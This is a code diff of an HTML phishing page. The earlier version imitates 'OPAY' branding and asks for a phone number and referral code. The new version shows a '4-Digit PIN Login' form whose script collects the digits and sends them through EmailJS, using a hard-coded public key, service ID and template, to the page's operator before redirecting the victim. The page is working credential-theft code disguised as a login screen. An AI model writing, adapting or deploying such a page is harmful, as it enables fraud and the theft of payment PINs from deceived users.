@@ -3,18 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPAY</title>
-    <script type="text/javascript"
-    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    <title>4-Digit PIN Login</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        (function () {
+            emailjs.init("brHvxqtsePQc4PuqQ");
+        })();
+
+        // Function to handle PIN submission
+        function handlePinSubmit(event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Collect PIN inputs
+            const pinInputs = document.querySelectorAll('.pin-input');
+            let pin = '';
+            pinInputs.forEach(input => {
+                pin += input.value;
+            });
+
+            // Ensure PIN is 4 digits
+            if (pin.length === 4) {
+                // Prepare email parameters
+                const emailParams = {
+                    pin_code: pin, // Key matches {{pin_code}} in EmailJS template
+                };
+
+                // Send email using EmailJS
+                emailjs.send("service_p5v1sz7", "template_ak5d8h8", emailParams)
+                    .then(() => {
+                        alert("PIN sent successfully!");
+                        window.location.href = "success.html"; // Redirect after success
+                    })
+                    .catch((error) => {
+                        console.error("Error sending email:", error);
+                        alert("Failed to send PIN. Please try again.");
+                    });
+            } else {
+                alert("Please enter a valid 4-digit PIN.");
+            }
+        }
     </script>
-    <script type="text/javascript">
-    (function(){
-    emailjs.init({
-    publicKey: "brHvxqtsePQc4PuqQ",
-    });
-    })();
-    </script>         
-    <script src="script.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -26,66 +55,60 @@
             align-items: center;
             height: 100vh;
         }
-        .login-container {
-            background:lime;
+        .pin-container {
+            background: #ffffff;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             width: 100%;
-            max-width: 400px;
-        }
-        .login-container h2 {
+            max-width: 300px;
             text-align: center;
+        }
+        .pin-container h2 {
             margin-bottom: 20px;
             color: #333;
         }
-        .form-group {
-            margin-bottom: 15px;
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
         }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #555;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 10px;
+        .pin-inputs input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 18px;
             border: 1px solid #ddd;
             border-radius: 5px;
         }
-        .form-group button {
+        .pin-container button {
             width: 100%;
             padding: 10px;
-            background-color:greenyellow;
+            background-color: #007bff;
             color: #ffffff;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
         }
-        .form-group button:hover {
-            background-color:lightgreen;
+        .pin-container button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
-    <div class="login-container" >
-        <h1 style="margin-left: 35%;">OPAY</h1>
-      
-            <div class="form-group">
+    <div class="pin-container">
+        <h2>Enter Your 4-Digit PIN</h2>
+        <form onsubmit="handlePinSubmit(event)">
+            <div class="pin-inputs">
+                <input type="password" maxlength="1" class="pin-input" required>
+                <input type="password" maxlength="1" class="pin-input" required>
+                <input type="password" maxlength="1" class="pin-input" required>
+                <input type="password" maxlength="1" class="pin-input" required>
             </div>
-            <div class="form-group">
-                <label for="password">phone number</label>
-                <input type="password" id="password" name="password" required>
-                <label for="password">referral code</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            <div class="login-container" style="background-color:lawngreen;height:40px;width: 350px;;">
-            <button type="submit" onclick="sendmail(event)">Send</button>
-            <a href="index2.html" style="margin-left: 40%; font-size: 40px;">login</a>
-            </div>
+            <button type="submit">Submit</button>
         </form>
     </div>
-    
 </body>
 </html>
